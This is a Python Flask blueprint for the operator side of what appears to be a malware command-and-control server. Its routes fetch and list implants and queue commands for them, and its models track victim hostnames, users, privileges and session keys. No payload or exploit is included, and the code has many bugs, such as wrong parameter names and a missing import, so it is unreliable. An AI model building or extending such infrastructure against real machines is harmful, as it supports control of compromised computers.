from datetime import datetime
from flask import (
    Blueprint, flash, g, redirect, render_template, request, url_for
)
from werkzeug.exceptions import abort

from .auth import login_required
from .db import db
from .models import Command, Implant, Operator

# TODO: Delete later, for testing only
import requests

operator = Blueprint('c2', __name__)


@operator.route('/')
def index():
    operators = Operator.query.all()
    return render_template('c2/index.html', operators=operators)

# TODO: Maybe put operator_id in header instead
@operator.route('/implant', methods=('GET'))
def get_implant():
    implant_id = request.args.get["implant_id"]
    operator_id = request.args.get["implant_id"]
    error = None

    if not implant_id:
        error = "implant_id is required."
    elif not operator_id:
        error = "operator_id is required."

    if error:
        return Response(response=error, status=400, mimetype='application/json')

    #  Check operator_id is valid
    operator = Operator.query.filter_by(id=operator_id).first()

    if not operator:
        error = "operator_id is not valid."
        return Response(response=error, status=400, mimetype='application/json')

    implant = Implant.query.filter_by(id=implant_id).first()

    return Response(response=implant, status=200, mimetype='application/json')

@operator.route('/implant/all', methods=('GET'))
def list_all_implants():
    error = None
    operator_id = request.args.get["implant_id"]

    if not operator_id:
        error = "operator_id is required."
        return Response(response=error, status=400, mimetype='application/json')

    implants = Operator.query.all()

    return Response(response=implants, status=200, mimetype='application/json')


# Set request content type to application/json
@operator.route('/storeCommandForImplant', methods=('POST'))
def store_command_for_implant():

    data = request.json
    command_type = data['command_type']
    command_text = data['command_text']
    implant_id = data['implant_id']
    operator_id = data['operator_id']
    error = None

    if not command_type:
        error = 'command_type is required.';
    elif not command_text:
        error = 'command_text is required.';
    elif not implant_id:
        error = 'implant_id is required.';
    elif not operator_id:
        error = 'operator_id is required.';

    # TODO: Get length of timestamp, update database
    time_issued = datetime.now()
    status = "not_taken_by_implant"
    command_result = None

    if error is None:
        command = Command(
            command_type = command_type,
            command_text = command_text,
            implant_id = implant_id,
            operator_id = operator_id,
            time_issued = time_issued,
            status = status,
            command_result = command_result
        )
        db.session.add(command)
        db.session.commit()
    else:
        return Response(response=error, status=400, mimetype='application/json')

    return Response(response='Command stored.', status=200, mimetype='application/json')


def make_test_implant():
    id = None

    try:
        implant = Implant(
            computer_name = "test_computer_name",
            computer_user = "test_computer_user",
            computer_privileges = "test_computer_privileges",
            connecting_ip_address = "test_connecting_ip_address",
            last_seen = "test_last_seen",
            expected_check_in = "test_expected_check_in",
            computer_guid = "test_computer_guid",
            session_key = "test_session_key",
            sleep = "test_sleep",
            jitter = "test_jitter",
            first_seen = "test_first_seen"
        )

        db.session.add(implant)
        db.session.commit()

        # Source: https://stackoverflow.com/questions/1316952/sqlalchemy-flush-and-get-inserted-id
        db.session.flush()
        db.session.refresh(implant, attribute_names=[])
        id = implant.id
    except Exception as e:
        print(f"Error in make_fake_implant: {e}")

    return id


def make_test_operator():
    id = None

    try:
        operator = Operator(
            username = "test_username",
            password_hash = "test_password_hash"
        )

        db.session.add(operator)
        db.session.commit()

        # Source: https://stackoverflow.com/questions/1316952/sqlalchemy-flush-and-get-inserted-id
        db.session.flush()
        db.session.refresh(operator, attribute_names=[])
        id = operator.id
    except Exception as e:
        print(f"Error in make_fake_operator: {e}")

    return id


# def test_get_implant():
#     implant_id = make_test_implant()
#     operator_id = make_test_operator()
#
#     print(f"implant_id = {implant_id}, operator_id = {operator_id}")
#
#     payload = {
#         'implant_id': implant_id,
#         'operator_id': operator_id
#     }
#
#     result = requests.post("", data=payload)
#     print(result)
#
# # Temporary testing
# if __none__ == '__main__':
#     # Run tests here
#     test_get_implant()
